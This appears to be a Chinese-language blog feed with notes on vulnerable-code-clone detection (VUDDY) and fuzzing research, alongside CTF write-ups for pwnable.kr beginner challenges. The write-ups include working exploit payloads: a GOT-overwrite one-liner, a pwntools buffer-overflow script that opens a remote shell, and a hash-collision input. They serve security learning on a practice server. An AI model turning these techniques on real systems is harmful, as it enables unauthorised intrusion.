src="https://tva1.sinaimg.cn/large/00831rSTly1gdgzasl4tcj30ss17gahj.jpg" alt="image-20200403230718496"></p><p><strong>Fingerprint generation</strong>：计算函数体以长度和hash值，示例见下</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdgzblu66ij30sg0mqjvd.jpg" alt="image-20200403230804731"></p><h3><span id="pclone-detector">Clone detector</span><a href="#pclone-detector" class="header-anchor">#</a></h3><p><strong>key lookup</strong>: 长度过滤</p><p><strong>hash lookup</strong>：hash比对</p><p>由于用了两层索引，速度很快，最差是O(n)</p><h2><span id="papplication-vulnerability-detection">Application：Vulnerability detection</span><a href="#papplication-vulnerability-detection" class="header-anchor">#</a></h2><h3><span id="pestablishing-a-vulnerability-database">Establishing a vulnerability database</span><a href="#pestablishing-a-vulnerability-database" class="header-anchor">#</a></h3><ul><li>Git clone</li><li>git log --grep=‘CVE-20’</li><li>Git show commit</li><li>Filter irrelevant commits.</li><li>git show the old file ID</li></ul><p>通过这种方法找到了9779个漏洞不行，对CVE去重后的1764个补丁中找到了5664个扣动函数</p><h3><span id="pvulnerability-detection">Vulnerability detection</span><a href="#pvulnerability-detection" class="header-anchor">#</a></h3><p>和clone detector没啥差别，但是是集合和集合间的交叉搜索</p><h2><span id="pimplememtation">Implememtation</span><a href="#pimplememtation" class="header-anchor">#</a></h2><ul><li>ANTLR实现函数提取部分</li><li>hash选用md5</li><li>字典选用python的<code>dict[Length]=[hash1,hash2..]</code></li></ul><h2><span id="pevalutaion">Evalutaion</span><a href="#pevalutaion" class="header-anchor">#</a></h2><p><strong>实验环境：</strong></p><ul><li>Ubuntu16.04</li><li>2.40 GHz Intel Zeon</li><li>32GB RAM</li><li>6TB HDD</li></ul><p>*<em>数据集：</em> 从2016.1.1到20167.28 github上的 25253个C/C++ git项目</p><p><strong>比较的配置：</strong></p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdh00x965jj30me06mab6.jpg" alt="image-20200403233225311"></p><p><strong>大数据量比较：</strong><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ger57bil1rj312c09iq56.jpg" alt="image-20200513212730805"></p><p><strong>准确率比较：</strong><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ger57knckxj30j60b00vd.jpg" alt="image-20200513212747666"></p><p><strong>完全克隆检测和抽象比较:</strong> 166个 VS 206个，后者比前者多了24%的结果</p><h2><span id="pcompare-with-redebug">Compare with redebug</span><a href="#pcompare-with-redebug" class="header-anchor">#</a></h2><ul><li>twice faster</li><li>less false positive</li><li>VUDDY可以检测第二类但是ReDeBug不行</li></ul><p>具体的分析就不说了</p><h2><span id="pdiscussion">Discussion</span><a href="#pdiscussion" class="header-anchor">#</a></h2><p>讨论了函数粒度的优势，包括时间复杂度、内存使用以及精度</p><h2><span id="pge-ren-kan-fa">个人看法</span><a href="#pge-ren-kan-fa" class="header-anchor">#</a></h2><ul><li>与redebug相比，把粒度加大到函数，错误率与redebug相比会降低很多</li><li>当redebug的窗口设置为函数体大小时，就等于不进行正规化的VUDDY</li><li>从使用效果来看，其实还是有部分误报情况的，准确度和具体的项目有很大关系</li></ul>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— random</title>
    <url>/a4584c42.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="prandom-c">random.c</span><a href="#prandom-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">random</span>;</span><br><span class="line">	<span class="built_in">random</span> = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ <span class="built_in">random</span>) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>当<code>rand()</code>函数未设置随机种子时，默认随机种子为1，而种子相同时，每次产生的伪随机数序列都是相同的</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">random@ubuntu:~$ ./random </span><br><span class="line">3039230856</span><br><span class="line">Good!</span><br><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Mommy, I thought libc random is unpredictable...</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— passcode</title>
    <url>/488eb6ec.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目要求我们使用ssh登录到服务器上查看<code>ssh passcode@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="ppasscode-c">passcode.c</span><a href="#ppasscode-c" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>考点：</p><ul><li>GOT表</li><li>scanf使用错误</li></ul><p>可以看到在函数login中对scanf的使用错误，因此我们只要能控制passcode1的值，就可以控制写入的地址</p><p>同时welcome没有参数，login也没有参数，我们可以通过welcome中的name来控制login中的passcode1的值。</p><p>用<code>objdump -S passcode</code>查看汇编代码可以看到，<code>name</code>位于<code>ebp-0x70</code>，<code>passcode1</code>位于<code>ebp-0x10</code>，<code>passcode2</code>位于<code>ebp-0xc</code>，但是<code>name</code>读入长度为100，无法覆盖到<code>passcode2</code>的值。<br>看下可执行文件中的函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.plt' at offset 0x398 contains 9 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class="line">0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0</span><br><span class="line">0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0</span><br><span class="line">0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0</span><br><span class="line">0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0</span><br><span class="line">0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>可以在<code>passcode1</code>覆盖为<code>printf</code>函数的<code>GOT</code>地址，然后再输入<code>system</code>函数位置，则下次执行<code>printf</code>时其实执行的是<code>system(&quot;/etc/cat flag&quot;)</code>，在这里要注意的是调用前的参数赋值等，<code>system</code>的执行位置应放在 <code>0x80485e3</code></p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passcode@ubuntu:~$ python -c "print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'" | ./passcode</span><br><span class="line">Toddler's Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">enter passcode1 : Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>Now I can safely trust you that you have credential :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— flag</title>
    <url>/5bc7dc4f.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! let&#39;s open it.</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>下载下来，先用<code>pwntools</code>来看下<code>checksec</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ checksec flag</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ubuntu&#x2F;flag&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br></pre></td></tr></table></figure><p>可以看到有UPX的壳，使用UPX工具去壳 <a href="https://upx.github.io/" target="_blank" rel="noopener">官方链接</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~&#x2F;upx$ .&#x2F;upx -d ..&#x2F;flag </span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2018</span><br><span class="line">UPX 3.95        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Aug 26th 2018</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux&#x2F;amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure><p>看起来好像没什么了，flag文件也非常的大</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>用<code>strings</code>命令看下里面的字符串，得到flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ strings flag | grep &#39;:)&#39;</span><br><span class="line">UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure><p><code>flag</code>：<code>UPX...? sounds like a delivery service :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— bof</title>
    <url>/a4584c42.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>先看下文件，然后nc上去进行数据输入</p><a id="more"></a><h2><span id="pbof-c">bof.c</span><a href="#pbof-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">	char overflowme[32];</span><br><span class="line">	printf(&quot;overflow me : &quot;);</span><br><span class="line">	gets(overflowme);	&#x2F;&#x2F; smash me!</span><br><span class="line">	if(key &#x3D;&#x3D; 0xcafebabe)&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Nah..\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	func(0xdeadbeef);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>把<code>bof</code>拖进IDA里看下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned int __cdecl func(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-2Ch]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  puts(&quot;overflow me : &quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  if ( a1 &#x3D;&#x3D; -889275714 )</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Nah..&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>main</code>函数调用<code>func</code>时，留出位置给key，所以让buffer溢出到key，填入<code>0xcafebabe</code>即可。IDA告诉我们s的位置位于<code>ebp-2Ch</code>处，而key的位置在<code>ebp+8h</code>处。中间要填上52个字节。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>写python脚本如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ssh &#x3D; remote(&quot;pwnable.kr&quot;,9000)</span><br><span class="line">payload &#x3D; &quot;a&quot;*52+p32(0xcafebabe)</span><br><span class="line">ssh.send(payload)</span><br><span class="line">ssh.interactive()</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:~$ python bof.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">log2</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to pwnable.kr port 9000</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>daddy, I just pwned a buFFer :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— collision</title>
    <url>/90653887.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目需要我们使用ssh登录到服务器上查看<code>ssh col@pwnable.kr -p2222</code>，密码是<code>guest</code>,有的时候可能有身份的校验，这个时候需要加上参数<code>-o StrictHostKeyChecking=no</code>进行登录</p><a id="more"></a><h2><span id="pcol-c">col.c</span><a href="#pcol-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode &#x3D; 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip &#x3D; (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res&#x3D;0;</span><br><span class="line">	for(i&#x3D;0; i&lt;5; i++)&#123;</span><br><span class="line">		res +&#x3D; ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) !&#x3D; 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode &#x3D;&#x3D; check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;&#x2F;bin&#x2F;cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>可以看到，要求输入一个20个字符组成的串，然后在check_password函数中，以int的方式读取这20个字符的值，如果加起来的值等于<code>0x21DD09EC</code>的话，那么就可以通过<code>hashcode==check_password(argv[1])</code>的判断，读取<code>flag</code>的内容。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>随便凑五个数，比如有<code>0x05050505*4+0xdc8f5d8</code>，那么可以写出以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">col@ubuntu:~$ .&#x2F;col &#96;python -c &#39;print(&quot;\x05&quot;*16+&quot;\xd8\xf5\xc8\x0d&quot;)&#39;&#96;</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>daddy! I just managed to create a hash collision :)</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>The Art, Science, and Engineering of Fuzzing(TSE 2019)</title>
    <url>/92a4b7cb.html</url>
    <content><![CDATA[<h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><blockquote><p>Fuzzing三大优点：部署简单、门槛低、已有的大量经验证明了它的有效性。</p></blockquote><p>前人研究已经很多了，本文主要是做了一个系统的梳理blabla套话，目的是系统地探索模型模糊器各个阶段的设计决策，使我们的fuzzing设计更加行之有效。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>对于hacker来说，fuzzing可以用来进行渗透测试和编写exp，而白帽则想利用fuzzing在被hacker攻击前找到漏洞所在。</p><p>此前已经有很多成功的研究和经典的fuzzing案例了，但不行的是，fuzzing好像遇到了瓶颈。后面的话没用了，大意就是不同论文表意不一致云云等原因搞的fuzzing领域的研究有点乱了。</p><p>所以，本文需要对前面的所有fuzzing研究进行提炼和升华。</p><p><strong>章节安排：</strong></p><p>第2节统一fuzzing术语和核心fuzzing框架，3-7节讲fuzzing每个阶段，调查相关文献，解释设计选择，讨论重要的权衡，并强调许多了不起的工程努力，有助于使现代fuzzing有效地完成其任务。</p><h2><span id="psystemization-taxonomy-and-test-programs">Systemization, Taxonomy, and Test Programs</span><a href="#psystemization-taxonomy-and-test-programs" class="header-anchor">#</a></h2><h3><span id="pfuzzing-amp-fuzzing-testing">fuzzing &amp; fuzzing testing</span><a href="#pfuzzing-amp-fuzzing-testing" class="header-anchor">#</a></h3><blockquote><p>Fuzzing：对可能的输入进行采样，得到对应的输出，类似于x-&gt;f(x)</p><p>Fuzzi testing: 目标是为了寻找bug和漏洞的fuzzing</p><p>Fuzzer：进行fuzz testing的程序</p><p>Fuzz Campaign：有一定安全策略的运行一个fuzzer</p><p>Bug Oracle：待检测的样本</p><p>Fuzz Configuration：fuzz的算法和策略，例如种子如何生成等</p></blockquote><h3><span id="ppaper-selection-criteria">Paper Selection Criteria</span><a href="#ppaper-selection-criteria" class="header-anchor">#</a></h3><p>选了哪些会议的文章云云</p><h3><span id="pfuzz-testing-algorithm">Fuzz Testing Algorithm</span><a href="#pfuzz-testing-algorithm" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gd5h2obcfdj30po0eudic.jpg" alt="image-20200325001530872"></p><blockquote><p>模糊测试的算法目的是：在有限的时间，一定的约束条件下找到有限的bugs</p></blockquote><p>算法可以分为两个部分：Preprocess部分和 n轮的循环，循环包含五个部分（但在实际中有的可以不要）：schedule、inputgen、inputeval、confupdate、continue，从名字上可以很显然的看出来都是在做什么。一次循环在本文中称为fuzz iteration，简单理解就相当于编译里面的一个pass吧。一次inputeval称为fuzz run。</p><ul><li>$\text{PREPROCESS}(\mathbb{C}) \rightarrow \mathbb{C}$ ：根据用户的fuzzing configuration 进行一些可能的修改和获取一些fuzz中需要信息，比如插装，样本运行时间等</li><li>$\text { SCHEDULE (} \mathbb{C}, \left.t_{\text {elapsed }}, t_{\text {limit }}\right) \rightarrow \text { conf }$ ：根据当前时间和截止时间从当前的fuzzing configure里选取一个待测configure</li><li>$\text { INPUTGEN (conf) } \rightarrow \text { tcs }$ ：根据configure生成待测用例</li><li>$\text { Inpureval (conf, }\left. \text { tcs, } O_{\text {bug }}\right) \rightarrow \mathbb{B}^{\prime} , execinfos$ : 以生成用例和configure，并嵌入bug oracle（检查是否为bug）输入，得到bug和执行信息</li><li>$\text { CONFUPDATE (} \mathbb{C}, conf, execinfos) \rightarrow \mathbb{C}$ ：更新策略</li><li>$\text { CONTINUE }(\mathbb{C}) \rightarrow{\text { True, False }}$ ：判断是否退出</li></ul><h3><span id="ptaxonomy-of-fuzzers">Taxonomy of Fuzzers</span><a href="#ptaxonomy-of-fuzzers" class="header-anchor">#</a></h3><p>黑盒、白盒、灰盒</p><h3><span id="pfuzzer-genealogy-and-overview">Fuzzer Genealogy and Overview</span><a href="#pfuzzer-genealogy-and-overview" class="header-anchor">#</a></h3><p>不得不说汇总的真详细，直接po图了，各个研究的时间线，黑白灰，以及侧重方向一览无余</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdca4wf3u7j30u00xvtev.jpg" alt="image-20200330213421085"></p><p>以及一个整理好的表</p><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdca5cldlbj30u011f7g6.jpg" alt="image-20200330213449440"></p><h2><span id="ppreprocess">PreProcess</span><a href="#ppreprocess" class="header-anchor">#</a></h2><h3><span id="pinstrumentation">Instrumentation</span><a href="#pinstrumentation" class="header-anchor">#</a></h3><p>通过插桩来获取在fuzz过程中的有用信息，可以是静态的插桩，也可以是动态的插桩</p><p>静态插桩需要的开销要小，但是需要找同版本的依赖库编译，除了源代码级别的静态插桩，也有二进制级别的静态插桩</p><p>动态插桩需要的开销要大，不过好处是更容易检测动态链接库，工具有：DynInst , DynamoRIO , Pin , Valgrind, and QEMU.</p><p>有的fuzzer可以静态插桩也可以动态插桩</p><ul><li>Execution Feedback：<ul><li>路径覆盖：AFL及其衍生、CollAFL</li><li>结点覆盖：LibFuzzer、Syzkaller</li><li>可选：Honggfuzz</li></ul></li><li>In-Memory Fuzzing：对于一些应用，例如有GUI的程序，初始化绘制GUI什么会浪费时间，这个时候可以dump下初始化后的内存空间来节约时间。有的fuzzer在内存中对一个函数反复fuzzing，称为API fuzzing。缺点：1.不好重建bug产生时的上下文进行复现。2.对于跨函数调用的fuzz可能会出问题。</li><li>Thread Scheduling：条件竞争很难触发，因为它们依赖于不确定的行为，这种行为可能很少发生。但是，通过显式地控制线程的调度方式，插桩也可以用来触发不同的非确定性程序行为已有的研究表明，即使随机调度线程也可以有效地发现竞争条件错误。</li></ul><h3><span id="pseed-selection">Seed Selection</span><a href="#pseed-selection" 